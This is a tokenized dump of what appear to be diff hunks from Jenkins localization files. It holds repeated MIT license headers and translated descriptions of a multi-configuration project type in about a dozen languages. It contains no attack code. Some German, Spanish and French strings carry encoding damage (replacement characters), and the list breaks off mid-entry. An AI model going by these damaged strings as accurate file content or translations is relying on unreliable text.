"ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "\\", "u9879", "\\", "u76ee", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Project", "=", "\\", "u5C08", "\\", "u6848", "Project", "\\", "name", "=", "\\", "u5c08", "\\", "u6848", "\\", "u540d", "\\", "u7a31", "Disable", "\\", "Project", "=", "\\", "u505C", "\\", "u7528", "\\", "u5C08", "\\", "u6848", "Latest", "\\", "Test", "\\", "Result", "=", "\\", "u6700", "\\", "u65b0", "\\", "u6e2c", "\\", "u8a66", "\\", "u7d50", "\\", "u679c", "@", "@", "-", "1", ",", "28", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "div", ">", "$", "{%", "body", "}", "<", "/", "div", ">", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "Suitable", "for", "projects", "that", "need", "a", "large", "number", "of", "different", "configurations", ",", "\\", "such", "as", "testing", "on", "multiple", "environments", ",", "platform", "-", "specific", "builds", ",", "etc", ".", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "body", "=", "\\", "u0645", "\\", "u0646", "\\", "u0627", "\\", "u0633", "\\", "u0628", "\\", "u0629", "\\", "u0644", "\\", "u0644", "\\", "u0645", "\\", "u0634", "\\", "u0627", "\\", "u0631", "\\", "u064A", "\\", "u0639", "\\", "u0627", "\\", "u0644", "\\", "u062A", "\\", "u064A", "\\", "u062A", "\\", "u062D", "\\", "u062A", "\\", "u0627", "\\", "u062C", "\\", "u0643", "\\", "u0645", "\\", "u064A", "\\", "u0629", "\\", "u0643", "\\", "u0628", "\\", "u064A", "\\", "u0631", "\\", "u0629", "\\", "u0645", "\\", "u0646", "\\", "u0625", "\\", "u0639", "\\", "u062F", "\\", "u0627", "\\", "u062F", "\\", "u0627", "\\", "u062A", "\\", "u0645", "\\", "u062E", "\\", "u062A", "\\", "u0644", "\\", "u0641", "\\", "u0629", "\\", "u060C", "\\", "u0645", "\\", "u062B", "\\", "u0644", "\\", "u0627", "\\", "u062E", "\\", "u062A", "\\", "u0628", "\\", "u0627", "\\", "u0631", "\\", "u0645", "\\", "u0634", "\\", "u0631", "\\", "u0648", "\\", "u0639", "\\", "u0641", "\\", "u064A", "\\", "u0639", "\\", "u062F", "\\", "u0629", "\\", "u0628", "\\", "u064A", "\\", "u0626", "\\", "u0627", "\\", "u062A", "\\", "u060C", "\\", "u0645", "\\", "u0634", "\\", "u0627", "\\", "u0631", "\\", "u064A", "\\", "u0639", "\\", "u0645", "\\", "u062E", "\\", "u0635", "\\", "u0635", "\\", "u0629", "\\", "u0644", "\\", "u0645", "\\", "u0646", "\\", "u0635", "\\", "u0627", "\\", "u062A", "\\", "u0645", "\\", "u0639", "\\", "u064A", "\\", "u0646", "\\", "u0629", "\\", "u060C", "\\", "u0625", "\\", "u0644", "\\", "u062E", ".", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "Velegnet", "til", "projekter", ",", "der", "har", "behov", "for", "mange", "forskellige", "konfigurationer", ",", "s", "\\", "u00E5som", "test", "p", "\\", "u00E5", "flere", "omgivelser", ",", "operativsystemer", ",", "platformspecifikke", "byg", ",", "osv", ".", "@", "@", "-", "1", ",", "27", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Simon", "Wiest", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "Dieses", "Profil", "eignet", "sich", "sehr", "gut", "f", "\ufffd", "r", "Projekte", "mit", "zahlreichen", "\\", "Konfigurationen", ",", "die", "etwa", "in", "unterschiedlichen", "Umgebungen", "getestet", "oder", "\\", "plattformspezifisch", "gebaut", "werden", "m", "\ufffd", "ssen", ".", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "Adecuado", "para", "proyectos", "que", "requieran", "un", "gran", "n", "\ufffd", "mero", "de", "configuraciones", "diferentes", ",", "\\", "como", "testear", "en", "multiples", "entornos", ",", "ejecutar", "sobre", "plataformas", "concretas", ",", "etc", ".", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "body", "=", "Sobib", "projektidele", ",", "mis", "n", "\\", "u00F5uavad", "suurt", "hulka", "erinevaid", "konfiguratsioone", ".", "N", "\\", "u00E4iteks", "paljudes", "platvormides", "testimine", "v", "\\", "u00F5i", "platvormide", "jaoks", "ehitamine", ".", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "body", "=", "Sopii", "projekteille", ",", "joissa", "on", "paljon", "erilaisia", "konfiguraatioita", ",", "kuten", "k", "\\", "u00E4", "\\", "u00E4nnt", "\\", "u00E4mist", "\\", "u00E4", "tai", "testaamista", "useilla", "alustoilla", ".", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Eric", "Lefevre", "-", "Ardant", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "Adapt", "\ufffd", "aux", "projets", "qui", "n", "\ufffd", "cessitent", "un", "grand", "nombre", "de", "configurations", "diff", "\ufffd", "rentes", ",", "\\", "comme", "des", "environnements", "de", "test", "multiples", ",", "des", "binaires", "sp", "\ufffd", "cifiques", "\ufffd", "une", "plateforme", ",", "etc", ".", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "body", "=", "\\", "u0905", "\\", "u0928", "\\", "u0947", "\\", "u0915", "\\", "u0935", "\\", "u093F", "\\", "u092D", "\\", "u093F", "\\", "u0928", "\\", "u094D", "\\", "u0928", "\\", "u0935", "\\", "u093F", "\\", "u0928", "\\", "u094D", "\\", "u092F", "\\", "u093E", "\\", "u0938", "\\", "u094B", "\\", "u0902", "\\", "u0915", "\\", "u0940", "\\", "u092C", "\\", "u0921", "\\", "u093C", "\\", "u0940", "\\", "u092A", "\\", "u0930", "\\", "u093F", "\\", "u092F", "\\", "u094B", "\\", "u091C", "\\", "u0928", "\\", "u093E", "\\", "u0913", "\\", "u0902", "\\", "u0915", "\\", "u0947", "\\", "u0932", "\\", "u093F", "\\", "u090F", "\\", "u0909", "\\", "u092A", "\\", "u092F", "\\", "u0941", "\\", "u0915", "\\", "u094D", "\\", "u0924", "-", "\\", "u091C", "\\", "u0948", "\\", "u0938", "\\", "u0947", "\\", "u0915", "\\", "u093F", "\\", "u090F", "\\", "u0915", "\\", "u093E", "\\", "u0927", "\\", "u093F", "\\", "u0915", "\\", "u0935", "\\", "u093E", "\\", "u0924", "\\", "u093E", "\\", "u0935", "\\", "u0930", "\\", "u0923", "\\", "u092A", "\\", "u0930", "\\", "u092A", "\\", "u0930", "\\", "u093F", "\\", "u0915", "\\", "u094D", "\\", "u0937", "\\", "u0923", ",", "\\", "u092E", "\\", "u0902", "\\", "u091A", "-", "\\", "u0935", "\\", "u093F", "\\", "u0936", "\\", "u093F", "\\", "u0937", "\\", "u094D", "\\", "u091F", "\\", "u0928", "\\", "u093F", "\\", "u0930", "\\", "u094D", "\\", "u092E", "\\", "u093E", "\\", "u0923", "\\", "u0906", "\\", "u0926", "\\", "u093F", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "Adatto", "a", "progetto", "che", "necessitano", "di", "un", "ampio", "numero", "di", "configurazioni", "diverse", ",", "come", "test", "su", "pi", "\\", "u00F9", "ambienti", ",", "build", "specifiche", "per", "piattaforma", ",", "ecc", ".", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "cactusman", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "\\", "u8907", "\\", "u6570", "\\", "u306e", "\\", "u74b0", "\\", "u5883", "\\", "u3067", "\\", "u306e", "\\", "u30c6", "\\", "u30b9", "\\", "u30c8", "\\", "u3084", "\\", "u3001", "\\", "u30d7", "\\", "u30e9", "\\", "u30c3", "\\", "u30c8", "\\", "u30d5", "\\", "u30a9", "\\", "u30fc", "\\", "u30e0", "\\", "u3054", "\\", "u3068", "\\", "u306e", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u306a", "\\", "u3069", "\\", "u3068", "\\", "u3044", "\\", "u3063", "\\", "u305f", "\\", "u3001", "\\", "u591a", "\\", "u6570", "\\", "u306e", "\\", "u7570", "\\", "u306a", "\\", "u308b", "\\", "u69cb", "\\", "u6210", "\\", "u304c", "\\", "u5fc5", "\\", "u8981", "\\", "u306a", "\\", "u30d7", "\\", "u30ed", "\\", "u30b8", "\\", "u30a7", "\\", "u30af", "\\", "u30c8", "\\", "u306b", "\\", "u9069", "\\", "u3057", "\\", "u3066", "\\", "u3044", "\\", "u307e", "\\", "u3059", "\\", "u3002", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "body", "=", "\\", "uB2E4", "\\", "uC591", "\\", "uD55C", "\\", "uD658", "\\", "uACBD", "\\", "uC5D0", "\\", "uC11C", "\\", "uC758", "\\", "uD14C", "\\", "uC2A4", "\\", "uD2B8", ",", "\\", "uD50C", "\\", "uB798", "\\", "uD3FC", "\\", "uD2B9", "\\", "uC131", "\\", "uBE4C", "\\", "uB4DC", ",", "\\", "uAE30", "\\", "uD0C0", "\\", "uB4F1", "\\", "uB4F1", "\\", "uCC98", "\\", "uB7FC", "\\", "uB2E4", "\\", "uC218", "\\", "uC758", "\\", "uC11C", "\\", "uB85C", "\\", "uB2E4", "\\", "uB978", "\\", "uD658", "\\", "uACBD", "\\", "uC124", "\\", "uC815", "\\", "uC774", "\\", "uD544", "\\", "uC694", "\\", "uD55C", "\\", "uD504", "\\", "uB85C", "\\", 